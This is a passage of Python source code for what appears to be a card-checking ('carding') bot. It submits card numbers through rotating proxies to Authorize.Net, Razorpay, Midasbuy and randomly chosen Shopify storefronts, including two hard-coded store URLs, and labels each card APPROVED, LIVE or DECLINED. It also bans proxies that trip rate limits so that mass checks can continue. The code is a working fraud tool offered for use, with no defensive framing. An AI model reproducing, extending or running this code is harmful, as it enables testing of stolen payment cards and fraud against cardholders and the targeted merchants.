        result = resp.text.lower()
        if 'approved' in result or 'success' in result:
            return "CHARGE $1.00", "APPROVED"
        if 'insufficient' in result:
            return "INSUFFICIENT FUNDS", "DECLINED"
        if 'declined' in result:
            return "DECLINED", "DECLINED"
        return f"Unknown response: {resp.text[:50]}", "ERROR"
    except Exception as e:
        return f"Authorize.Net error: {str(e)[:80]}", "ERROR"
    finally:
        try:
            s.close()
        except Exception:
            pass


# ============================================================================
# RAZORPAY
# ============================================================================
def check_razorpay(cc: str, proxy: Optional[str] = None,
                   site: Optional[str] = None,
                   all_proxies: Optional[List[str]] = None,
                   max_attempts: int = 2) -> Tuple[str, str]:
    if not site:
        return "No site provided. Use /addrz to add sites and /mrz for mass check.", "ERROR"
    site_id = hashlib.md5(site.encode()).hexdigest()[:5]

    max_attempts = max(1, int(max_attempts))
    pool_size = len(all_proxies) if all_proxies else (1 if proxy else 0)
    ban_429  = _proxy_ban_time_for_pool(pool_size, PROXY_BAN_429_CEILING)
    ban_dead = _proxy_ban_time_for_pool(pool_size, PROXY_BAN_DEAD_CEILING)

    cur_proxy = proxy
    last_error = None

    for attempt in range(max_attempts):
        if all_proxies and (cur_proxy is None or _proxy_banned(cur_proxy)):
            cur_proxy = _pick_proxy(all_proxies, relax=True)

        params = {'cc': cc, 'site': site}
        if cur_proxy:
            params['proxy'] = cur_proxy
        headers = {"X-API-Key": RAZORPAY_API_KEY}

        try:
            resp = _HTTP_API.get(RAZORPAY_API_URL, params=params, headers=headers,
                                 timeout=httpx.Timeout(60.0, connect=15.0))
            if resp.status_code != 200:
                last_error = (f"API error (HTTP {resp.status_code}) [ID: {site_id}]", "ERROR")
                continue
            data = resp.json()
            if 'error' in data:
                msg = f"Error: {data['error']} [ID: {site_id}]"
                cls = _classify(msg)
                if cls == 'RATE_LIMIT' and cur_proxy:
                    _ban_proxy(cur_proxy, ban_429)
                    cur_proxy = None
                    last_error = (msg, "ERROR")
                    continue
                if cls in ('DEAD_PROXY', 'SERVICE_ERR') and cur_proxy:
                    _ban_proxy(cur_proxy, ban_dead)
                    cur_proxy = None
                    last_error = (msg, "ERROR")
                    continue
                return msg, "ERROR"

            status = data.get('status')
            response = data.get('response', '')
            if status in ('approved', 'charged'):
                return f"APPROVED – {response} [ID: {site_id}]", "APPROVED"
            if status == 'declined':
                return f"DECLINED – {response} [ID: {site_id}]", "DECLINED"
            last_error = (f"Unknown – {response} [ID: {site_id}]", "ERROR")
        except httpx.ConnectError:
            if cur_proxy:
                _ban_proxy(cur_proxy, ban_dead)
            cur_proxy = None
            last_error = (f"Razorpay API unreachable [ID: {site_id}]", "ERROR")
        except httpx.TimeoutException:
            if cur_proxy:
                _ban_proxy(cur_proxy, ban_dead)
            cur_proxy = None
            last_error = (f"Razorpay timeout (60s) [ID: {site_id}]", "ERROR")
        except Exception as e:
            last_error = (f"Razorpay API error: {str(e)[:40]} [ID: {site_id}]", "ERROR")

    return last_error or (f"Razorpay: no attempt succeeded [ID: {site_id}]", "ERROR")


check_razorpay_api = check_razorpay


# ============================================================================
# MIDASBUY
# ============================================================================
@with_retries(max_attempts=2)
def check_midasbuy(cc: str, proxy: Optional[str] = None) -> Tuple[str, str]:
    try:
        params = {'cc': cc}
        resp = _HTTP_API.get(MIDASBUY_API, params=params,
                             timeout=httpx.Timeout(60.0, connect=15.0))
        resp.raise_for_status()
        data = resp.json()
        if 'response' in data:
            inner = data['response']
            result = inner.get('result', None)
            msg = inner.get('message', 'unknown')
            if result == 0 or 'success' in msg.lower() or 'approved' in msg.lower():
                return f"APPROVED – {msg}", "APPROVED"
            if '3d' in msg.lower() or 'otp' in msg.lower() or 'action' in msg.lower():
                return f"LIVE (3DS Required) – {msg}", "DECLINED"
            if 'insufficient' in msg.lower():
                return f"LIVE (Insufficient) – {msg}", "DECLINED"
            return f"DECLINED – {msg}", "DECLINED"
        return f"Unknown response: {json.dumps(data)[:100]}", "ERROR"
    except Exception as e:
        return f"Midasbuy Error: {str(e)[:60]}", "ERROR"


# ============================================================================
# ALIASES
# ============================================================================
check_stripe_api     = check_stripe_charge
check_b3_auth        = check_stripe_auth
check_vbv            = check_vbv_lookup
check_braintree      = check_braintree_api
check_razor          = check_razorpay
check_midas          = check_midasbuy
check_rz             = check_razorpay
check_stripe5        = check_stripe_charge


def shopify_check(cc: str, proxy: Optional[str] = None) -> Tuple[str, str]:
    FALLBACK_SITES = [
        "https://bb73c3-5.myshopify.com",
        "https://travelerchoicetravelware.myshopify.com",
    ]
    site = random.choice(FALLBACK_SITES)
    resp = check_shopify_api(site, cc, proxy)
    return process_shopify_api_response(resp)[:2]


check_chaos          = shopify_check
check_adyen          = shopify_check
check_app_auth       = shopify_check
check_stripe_onyx    = check_stripe_auth
check_arcenus        = shopify_check
check_stripe_working = check_stripe_auth
check_payflow        = shopify_check
check_random         = shopify_check
check_shopify_onyx   = shopify_check
check_skrill         = shopify_check
check_random_stripe  = check_stripe_auth
check_payu           = shopify_check
check_sk_gateway     = shopify_check


# ============================================================================
# BAN-STATE INSPECTORS
# ============================================================================
def proxy_ban_count() -> int:
    with _BAN_LOCK:
        now = time.time()
        return sum(1 for t in _PROXY_BAN.values() if t > now)


def site_ban_count() -> int:
    with _BAN_LOCK:
        now = time.time()
        return sum(1 for t in _SITE_BAN.values() if t > now)


def banned_proxy_snapshot() -> Dict[str, float]:
    with _BAN_LOCK:
        now = time.time()
        return {p: t - now for p, t in _PROXY_BAN.items() if t > now}
